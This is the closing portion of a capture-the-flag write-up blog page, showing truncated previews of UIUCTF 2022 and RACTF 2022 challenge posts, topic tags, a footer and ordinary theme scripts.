<a href="/posts/UIUCTF-2022/"><div class="card-body"> <em class="small" data-ts="1659312000" data-df="ll" > Aug 1, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>UIUCTF 2022</h3><div class="text-muted small"><p> rev/safepy Description: godlike snake with a nebula behind it and math equations floating around it challenge file Given python script from sympy import * def parse(expr): # learned from ...</p></div></div></a></div><div class="card"> <a href="/posts/RACTF-2022/"><div class="card-body"> <em class="small" data-ts="1668902400" data-df="ll" > Nov 20, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>RACTF 2022</h3><div class="text-muted small"><p> crypto/Lightning Seeds Description: You won‚Äôt be able to break this, we used a randomizer! python file output file Python code #!/usr/bin/env python3 import random with open(&#39;flag.txt&#39;, &#39;r&#39;) as...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/RACTF-2022/" class="btn btn-outline-primary" prompt="Older"><p>RACTF 2022</p></a><div class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></div></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> ¬© 2023 <a href="https://twitter.com/3Cerberus_tm">gmvivekanandan</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/pyjail/">pyjail</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/git/">git</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
